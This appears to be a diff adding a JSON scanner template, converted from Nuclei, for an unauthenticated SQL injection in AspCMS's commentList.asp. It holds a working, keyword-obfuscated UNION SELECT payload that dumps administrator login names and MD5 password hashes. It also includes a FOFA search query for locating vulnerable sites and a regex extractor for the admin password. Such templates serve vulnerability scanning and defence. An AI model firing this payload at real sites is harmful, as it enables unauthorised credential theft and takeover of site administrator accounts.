@@ -1,0 +1,130 @@
+{
+  "id": "aspcms-commentlist-sqli",
+  "name": "AspCMS commentList.asp - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator\u0027s MD5 password.\n",
+  "references": [
+    "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/cms/AspCMS/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "aspcms",
+    "sqli",
+    "unauth"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"ASPCMS\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/plug/comment/commentList.asp?id\u003d-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 200",
+            "contains(body,\u0027clistbox\u0027) \u0026\u0026 contains(body,\u0027UserID,GroupID,LoginName,Password\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "aspcms-commentlist-sqli",
+    "info": {
+      "name": "AspCMS commentList.asp - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator\u0027s MD5 password.\n",
+      "reference": [
+        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/cms/AspCMS/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"ASPCMS\""
+      },
+      "tags": "aspcms,sqli,unauth"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/plug/comment/commentList.asp?id\u003d-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 200",
+              "contains(body,\u0027clistbox\u0027) \u0026\u0026 contains(body,\u0027UserID,GroupID,LoginName,Password\u0027)"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\u003cdiv class\u003d\"line2\"\u003e(.*?)\u003c/div\u003e"
+            ],
+            "group": 1,
+            "name": "admin_password",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
